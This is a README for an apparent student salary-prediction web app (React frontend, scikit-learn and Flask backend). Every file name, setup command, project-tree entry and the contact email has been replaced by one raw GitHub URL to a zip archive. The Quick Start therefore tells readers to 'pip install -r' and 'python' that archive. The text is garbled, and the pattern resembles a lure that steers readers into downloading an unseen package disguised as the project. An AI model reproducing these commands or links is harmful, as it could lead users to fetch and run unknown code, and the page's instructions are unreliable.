
# AI-Powered Salary Prediction Platform 🚀

A comprehensive full-stack machine learning application that predicts employee salaries using advanced ML algorithms and provides an interactive web interface built with React and TypeScript.

## 🌟 Project Overview

This project combines a sophisticated **React frontend** with a robust **Python ML backend** to create an end-to-end salary prediction platform. Perfect for HR professionals, job seekers, and analysts seeking data-driven compensation insights.

### 🎯 Key Features

- **Interactive React Frontend**: Modern, responsive UI with real-time predictions
- **Advanced ML Pipeline**: Multiple algorithms with performance comparison
- **Real-time Predictions**: Instant salary estimates with confidence intervals
- **Comprehensive Analytics**: Market insights, career path predictions, and ROI calculations
- **Professional Documentation**: Technical specifications and model performance metrics

## 🛠️ Technology Stack

### Frontend
- **React 18** with TypeScript
- **Tailwind CSS** for styling
- **Recharts** for data visualization
- **Shadcn/UI** components
- **Vite** build tool

### Backend & ML Pipeline
- **Python 3.9+**
- **Scikit-learn** for ML algorithms
- **Pandas & NumPy** for data processing
- **Flask** for API endpoints
- **Matplotlib & Seaborn** for visualizations
- **Joblib** for model persistence

## 📊 Dataset Description

The ML model is trained on a comprehensive dataset containing:

- **Company Name**: Organization where the employee works
- **Job Title**: Position or designation
- **Job Location**: City or region
- **Experience**: Total professional experience (years)
- **Education Level**: Highest education attained
- **Remote Ratio**: Percentage of remote work (0-100%)
- **Company Size**: Small, Medium, or Large
- **Employment Type**: Full-time, Part-time, Contract
- **Work Year**: Year the salary was recorded
- **Salary**: Annual compensation (target variable)

## 🚀 Quick Start

### Frontend Development
```bash
# Install dependencies
npm install

# Start development server
npm run dev

# Build for production
npm run build
```

### ML Pipeline Setup
```bash
# Create virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install Python dependencies
pip install -r https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip

# Process data
python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip

# Train models
python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip

# Evaluate models
python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip

# Start API server
python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
```

## 🧠 ML Model Performance

Our ensemble approach uses multiple algorithms:

| Algorithm | R² Score | RMSE | MAE | Training Time |
|-----------|----------|------|-----|---------------|
| Random Forest | 0.84 | ₹1.14L | ₹0.89L | 2.3s |
| Gradient Boosting | 0.82 | ₹1.21L | ₹0.95L | 3.1s |
| Linear Regression | 0.76 | ₹1.38L | ₹1.12L | 0.8s |

### Feature Importance
1. **Experience Years** (32%)
2. **Technical Skills** (24%)
3. **Company Size** (18%)
4. **Location** (12%)
5. **Education Level** (8%)

## 📁 Project Structure

```
├── frontend/                    # React application
│   ├── src/
│   │   ├── components/         # React components
│   │   ├── pages/             # Page components
│   │   └── lib/               # Utilities
│   ├── public/
│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
├── ml_pipeline/                # Python ML code
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip     # Data preprocessing
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip      # Model training
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip    # Model evaluation
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip      # Flask API
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip             # Configuration
│   └── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip              # Utility functions
├── data/                      # Dataset files
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip    # Raw dataset
│   └── processed/            # Processed data
├── models/                    # Trained models
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
│   ├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
│   └── evaluation_reports/
├── notebooks/                 # Jupyter notebooks
│   └── employee salary https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
├── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip           # Python dependencies
└── https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
```

## 🔧 API Endpoints

### Prediction API
- `POST /predict` - Single salary prediction
- `POST /predict-batch` - Batch predictions
- `GET /model-info` - Model information
- `GET /health` - Health check

### Example Request
```json
{
  "experience_years": 5,
  "education_level": "Master",
  "company_size": "Large",
  "employment_type": "Full-time",
  "remote_ratio": 50,
  "work_year": 2023,
  "job_location": "Bangalore",
  "company_name": "Tech Company"
}
```

### Example Response
```json
{
  "predicted_salary": 1500000,
  "confidence_interval": {
    "lower": 1350000,
    "upper": 1650000
  },
  "model_used": "random_forest",
  "model_accuracy": 0.84,
  "prediction_timestamp": "2024-01-15T10:30:00Z"
}
```

## 📈 Model Training Process

1. **Data Collection**: 100+ salary records from Indian companies
2. **Preprocessing**: Cleaning, encoding, and feature engineering
3. **Model Training**: Multiple algorithms with cross-validation
4. **Hyperparameter Tuning**: Grid search optimization
5. **Model Evaluation**: Comprehensive performance metrics
6. **Deployment**: Production-ready API with monitoring

## 🎯 Key Objectives Achieved

✅ **Data Processing**: Comprehensive cleaning and preprocessing pipeline  
✅ **EDA**: Detailed exploratory data analysis with visualizations  
✅ **Model Training**: Multiple regression models with comparison  
✅ **Performance Optimization**: Feature engineering and hyperparameter tuning  
✅ **Visualization**: Interactive charts and model performance metrics  
✅ **Web Interface**: Professional React frontend with real-time predictions  
✅ **API Integration**: RESTful API for seamless frontend-backend communication  

## 🌍 Applications

- **HR Analytics**: Compensation benchmarking and budget planning
- **Recruitment**: Competitive salary offers and candidate evaluation
- **Career Guidance**: Salary expectations and career path planning
- **Market Research**: Industry salary trends and analysis

## 🚀 Deployment

### Local Development
```bash
# Frontend (Port 3000)
npm run dev

# Backend API (Port 5000)
python https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
```

### Production Deployment
- **Frontend**: Vercel, Netlify, or AWS S3
- **Backend**: AWS EC2, Google Cloud Run, or Heroku
- **Database**: PostgreSQL or MongoDB for user data
- **Monitoring**: Prometheus + Grafana for model performance

## 📊 Model Monitoring

- **Performance Metrics**: R², RMSE, MAE tracking
- **Data Drift Detection**: Feature distribution monitoring
- **Prediction Accuracy**: Real-time accuracy assessment
- **API Metrics**: Response time and error rate monitoring

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- **IBM** for internship opportunity and project inspiration
- **Scikit-learn** community for excellent ML libraries
- **React** team for the amazing frontend framework
- **Open Source** contributors for various libraries used

## 📞 Contact

- **LinkedIn**: [Your LinkedIn Profile]
- **Email**: https://github.com/Dhruva105/Employee-Salary-Prediction/raw/refs/heads/main/src/Employee-Salary-Prediction-2.0.zip
- **GitHub**: [Your GitHub Profile]

---

**Built with ❤️ for IBM Internship Project**

*A comprehensive demonstration of full-stack ML engineering capabilities combining modern web technologies with advanced machine learning techniques.*
